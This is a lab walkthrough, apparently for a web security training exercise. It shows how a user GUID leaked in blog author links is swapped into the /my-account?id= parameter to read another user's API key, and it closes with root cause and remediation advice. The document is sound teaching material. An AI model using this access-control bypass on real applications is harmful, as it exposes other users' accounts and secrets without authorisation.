# User ID Controlled by Request Parameter, with Unpredictable User IDs

## Description

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for `carlos`, then submit his API key as the solution.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and inspect the account page

I accessed the lab using the `My account` button and logged in using the given credentials `wiener:peter`. After a successful login, I was redirected to:

```
/my-account?id=4695dd79-be44-4ec0-b827-60621591f450
```

As the lab description indicates, the `id` parameter determines whose account information is displayed, but here it uses a UUIDv4 rather than a predictable username. UUIDs of this form are designed to be effectively unguessable and impractical to brute-force directly.

### Step 2: Look for the GUID leaking elsewhere

Since brute-forcing the GUID was impractical, the next step was to check whether `carlos`'s GUID was disclosed anywhere else in the application, such as within blog post metadata.

I requested a few posts directly:

```http
GET /post?postId=1
GET /post?postId=2
GET /post?postId=3
```

In the response for `postId=3`, the blog post's author link disclosed `carlos`'s user ID:

```html
<p><span id=blog-author><a href='/blogs?userId=6ba38bc8-3f37-45a3-ad10-efa4849ae999'>carlos</a></span> | 16 July 2026</p>
<hr>
```

### Step 3: Substitute the GUID into the account page

I took the disclosed GUID and used it in place of `wiener`'s own `id` value:

```http
GET /my-account?id=6ba38bc8-3f37-45a3-ad10-efa4849ae999
```

The response returned `carlos`'s account details, including his API key, without verifying that the currently authenticated user (`wiener`) had any right to view this data:

```html
<div id=account-content>
    <p>Your username is: carlos</p>
    <div>Your API Key is: XzBH6PzSgEUq6CoQHh0pPs1NKkl60XqP</div><br/>
```

### Step 4: Submit the API key

I submitted the API key retrieved for `carlos`, which solved the lab.

## Root Cause

Although the application uses unpredictable UUIDs instead of sequential or guessable usernames to identify users in the `/my-account` endpoint, it still fails to verify that the requested `id` belongs to the currently authenticated user. The UUID's unpredictability only protects against blind guessing; it does not compensate for missing object-level authorization. Since the same GUID was disclosed elsewhere in the application (in blog post author links), an attacker did not need to guess it at all.

## Remediation

- Do not rely on the unpredictability of an identifier as an access control mechanism. Enforce server-side authorization checks that verify the requested resource belongs to, or is otherwise accessible by, the currently authenticated user.
- Avoid disclosing internal user identifiers in unrelated parts of the application, such as public-facing content, since any excessive information disclosure can undermine identifier-based obscurity.
- Derive the identity of the account being accessed from the authenticated session context wherever possible, rather than trusting a client-supplied identifier.